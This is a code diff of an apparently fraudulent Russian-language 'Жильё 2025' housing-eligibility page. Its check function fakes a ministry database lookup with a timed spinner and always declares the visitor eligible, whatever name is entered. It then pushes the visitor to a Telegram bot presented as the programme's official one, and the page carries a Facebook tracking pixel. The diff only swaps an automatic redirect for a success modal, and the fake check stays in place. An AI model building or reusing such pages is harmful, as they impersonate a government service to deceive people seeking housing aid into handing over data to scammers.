@@ -63,18 +63,26 @@ src="https://www.facebook.com/tr?id=713550937996335&ev=PageView&noscript=1"
   </section>
 
   <section id="check" class="py-16 bg-blue-50">
-    <div class="max-w-xl mx-auto text-center px-4 animate-[fadeInUp_1s_ease-out]">
-      <h2 class="text-2xl font-semibold text-blue-800 mb-4">Проверка права на жильё</h2>
-      <input id="iin" type="text" placeholder="Введите ФИО полностью" class="w-full border px-4 py-3 rounded-xl mb-4 shadow" />
-      <button onclick="checkIIN()" class="w-full bg-blue-700 text-white py-3 rounded-xl font-medium hover:bg-blue-800 transition">Проверить</button>
-      <div id="iin-loader" class="text-center mt-4 hidden">
-        <div class="w-12 h-12 border-4 border-blue-100 border-t-blue-700 rounded-full animate-spin mx-auto"></div>
-        <p class="text-sm text-blue-800 mt-3 font-semibold">Подключение к базе Министерства…</p>
-      </div>
-      <div id="iin-result" class="text-center mt-4 hidden text-green-700 font-semibold text-lg"></div>
-      <button onclick="openFaqModal('modal-status')" class="w-full mt-6 bg-green-600 text-white py-3 rounded-xl font-medium hover:bg-green-700 transition">📄 Проверить статус заявки</button>
+    <div class="max-w-xl mx-auto text-center px-4">
+        <h2 class="text-2xl font-semibold text-blue-800 mb-4">Проверка права на жильё</h2>
+        <input id="iin" type="text" placeholder="Введите ФИО полностью" class="w-full border px-4 py-3 rounded-xl mb-4 shadow" />
+        <button onclick="checkIIN()" class="w-full bg-blue-700 text-white py-3 rounded-xl font-medium hover:bg-blue-800 transition">Проверить</button>
+        
+        <div id="iin-loader" class="text-center mt-4 hidden">
+            <div class="w-12 h-12 border-4 border-blue-100 border-t-blue-700 rounded-full animate-spin mx-auto"></div>
+            <p class="text-sm text-blue-800 mt-3 font-semibold">Подключение к базе Министерства…</p>
+        </div>
+        
+        <div id="success-modal" class="fixed inset-0 hidden items-center justify-center bg-black bg-opacity-50 z-50">
+            <div class="bg-white rounded-xl p-6 w-11/12 max-w-md relative">
+                <button onclick="closeModal()" class="absolute top-2 right-3 text-xl">✖</button>
+                <h3 class="text-lg font-semibold text-blue-900 mb-4">✅ Вы имеете право на подачу заявки!</h3>
+                <p class="mb-4 text-gray-700">Для продолжения регистрации перейдите в официальный Telegram-бот программы «Жильё 2025».</p>
+                <a href="https://t.me/MyGovUzRasmiy_bot" target="_blank" class="w-full bg-green-600 text-white py-3 rounded-xl font-medium hover:bg-green-700 transition text-center block">Перейти в бот</a>
+            </div>
+        </div>
     </div>
-  </section>
+</section>
 
   <section id="faq" class="py-16 bg-white">
     <div class="max-w-4xl mx-auto px-4 animate-[fadeInUp_1s_ease-out]">
@@ -159,28 +167,29 @@ src="https://www.facebook.com/tr?id=713550937996335&ev=PageView&noscript=1"
       }, 300);
     }
 
-    function checkIIN() {
-      const input = document.getElementById("iin").value.trim();
-      const loader = document.getElementById("iin-loader");
-      const result = document.getElementById("iin-result");
+   function checkIIN() {
+        const input = document.getElementById("iin").value.trim();
+        const loader = document.getElementById("iin-loader");
+        const modal = document.getElementById("success-modal");
 
-      if (input.length < 7) {
-        alert("Введите полный ФИО");
-        return;
-      }
+        if (input.length < 7) {
+            alert("Введите полный ФИО");
+            return;
+        }
 
-      loader.classList.remove('hidden');
-      result.classList.add('hidden');
-
-      setTimeout(() => {
-        loader.classList.add('hidden');
-        result.innerText = "✅ Вы имеете право на подачу заявки. Открытие Telegram-бота...";
-        result.classList.remove('hidden');
+        loader.classList.remove('hidden');
+        
         setTimeout(() => {
-          window.location.href = "https://t.me/MyGovUzRasmiy_bot";
-        }, 1000);
-      }, 4500);
+            loader.classList.add('hidden');
+            modal.classList.remove('hidden');
+        }, 4500);
     }
-  </script>
+
+    function closeModal() {
+        const modal = document.getElementById("success-modal");
+        modal.classList.add('hidden');
+    }
+</script>
+
 </body>
 </html>
